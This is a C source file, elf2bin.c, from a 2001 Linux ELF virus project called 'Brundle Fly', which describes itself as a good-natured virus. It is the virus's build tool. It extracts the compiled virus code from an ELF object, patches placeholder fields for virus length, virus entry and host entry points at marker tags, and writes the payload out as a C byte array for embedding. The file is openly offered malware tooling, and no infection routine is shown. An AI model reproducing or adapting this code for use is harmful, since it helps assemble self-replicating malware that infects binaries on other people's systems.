/*
 * Brundle Fly - Good-natured Linux ELF virus supporting kernel 2.2 and 2.4
 * Copyright 2001 Konrad Rieck <kr@roqe.org>, Konrad Kretschmer <kk@roqe.org>
 * In memory to Seth Brundle 
 *
 * This program converts an ELF object to a C file containing the text 
 * segment as an array of charakters. Parts of the code are patched, as
 * virus_length, virus_entry, etc...
 *
 * $Id: elf2bin.c,v 1.7 2001/07/11 18:34:48 kr Exp $
 */

#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <config.h>

#include <elfio.h>
#include <brundle-fly.h>

unsigned char virus_data[PAGE_SIZE];
off_t virus_length = 0;
off_t virus_entry;
off_t host_entry;

/*
 * Find a tag in the virus_data, such as 0xdeadbeef. 
 */
off_t find_tag(unsigned char *tag)
{
    off_t i = 0;
    unsigned char *ptr = virus_data;

    while (i < virus_length - strlen(tag)) {
	if (!memcmp(ptr, tag, strlen(tag)))
	    return i;
	i++;
	ptr++;
    }
    return -1;
};

/*
 * The main function. 
 */
int main(int argc, char **argv)
{
    Elf_Ehdr *ehdr;
    Elf_Shdr *shdrs, *stmp;
    int src, i, off;
    FILE *dst;
    off_t ptr;

    if (argc != 3) {
	fprintf(stderr, "usage: cnvplain <input-elf> <output-c>\n");
	return EXIT_SUCCESS;
    }

    printf("- Converting elf %s to bin %s\n", argv[1], argv[2]);

    if ((src = open(argv[1], O_RDONLY)) < 0) {
	perror(argv[1]);
	exit(EXIT_FAILURE);
    }

    /*
     * Read in the ELF header and the section headers. 
     */
    ehdr = read_ehdr(src);
    shdrs = read_shdrs(src, ehdr);

    /*
     * Find the section that old our generated virus in the ELF object. 
     */
    for (i = 0, stmp = shdrs; i < ehdr->e_shnum; i++, stmp++)
	if (stmp->sh_type == SHT_PROGBITS && stmp->sh_size > 0)
	    break;

    virus_length = stmp->sh_size;
    lseek(src, stmp->sh_offset, SEEK_SET);

    printf("- Reading raw virus data from elf file: ");

    if (read(src, virus_data, virus_length) < virus_length) {
	perror(argv[1]);
	return (EXIT_FAILURE);
    }
    printf("done\n");

    close(src);

    free(ehdr);
    free(shdrs);

    /*
     * The rest of this source should be self explaining due to the heavy
     * usage of printf() statements.  
     */
    virus_entry = find_tag(VIRUS_ENTRY_TAG);
    host_entry = find_tag(HOST_ENTRY_TAG);

    if (virus_length > PAGE_SIZE) {
	fprintf(stderr, "Virus code is longer than a page size.\n"),
	    exit(EXIT_FAILURE);
    }

    if (virus_entry < 0) {
	fprintf(stderr, "Could not find the virus entry address.\n");
	exit(EXIT_FAILURE);
    }

    if (host_entry < 0) {
	fprintf(stderr, "Could not find the host entry address.\n");
	exit(EXIT_FAILURE);
    }


    printf("- Patching virus_length field.\n");
    for (i = 0; (ptr = find_tag(LENGTH_A_TAG)) > 0; i++)
	*(int *) &virus_data[ptr] = virus_length;

    if (!i) {
	fprintf(stderr, "Could not find virus_length address.\n");
	exit(EXIT_FAILURE);
    }

    printf("- Patching host_entry field.\n");
    for (i = 0; (ptr = find_tag(HOST_A_TAG)) > 0; i++)
	*(int *) &virus_data[ptr] = host_entry;

    if (!i) {
	fprintf(stderr, "Could not find host_entry field.\n");
	exit(EXIT_FAILURE);
    }

    printf("- Patching virus_entry field.\n");
    for (i = 0; (ptr = find_tag(VIRUS_A_TAG)) > 0; i++)
	*(int *) &virus_data[ptr] = virus_entry;

    if (!i) {
	fprintf(stderr, "Could not find virus_entry field.\n");
	exit(EXIT_FAILURE);
    }

    printf("- Locating virus_start field.\n");
    off = find_tag(VIRUS_A_START);
    if (off < 0) {
	fprintf(stderr, "Could not find virus_start field.\n");
	exit(EXIT_FAILURE);
    }

    printf("- Patching virus_start_off field.\n");
    for (i = 0; (ptr = find_tag(VIRUS_A_OFF_TAG)) > 0; i++)
	*(int *) &virus_data[ptr] = off;

    if (!i) {
	fprintf(stderr, "Could not find virus_start_off field.\n");
	exit(EXIT_FAILURE);
    }

    if (!(dst = fopen(argv[2], "w"))) {
	perror(argv[2]);
	exit(EXIT_FAILURE);
    }

    printf("- Construcing C file from binary: ");

    fprintf(dst, "#include <sys/types.h>\n\n");
    fprintf(dst, "size_t virus_length = %ld;\n", virus_length);
    fprintf(dst, "off_t virus_entry   = %ld;\n", virus_entry);
    fprintf(dst, "off_t host_entry    = %ld;\n", host_entry);
    fprintf(dst, "\n");
    fprintf(dst, "unsigned char virus_data[] =\n");

    for (i = 0; i <= virus_length; i++) {
	if (i % 16 == 0)
	    fprintf(dst, "\t\"");
	fprintf(dst, "\\x%2.2x", virus_data[i]);
	if (i > 0 && i % 16 == 15 && i < virus_length)
	    fprintf(dst, "\"\n");
	else if (i == virus_length)
	    fprintf(dst, "\";\n");
    }

    fclose(dst);
    printf("done\n");

    return EXIT_SUCCESS;
}
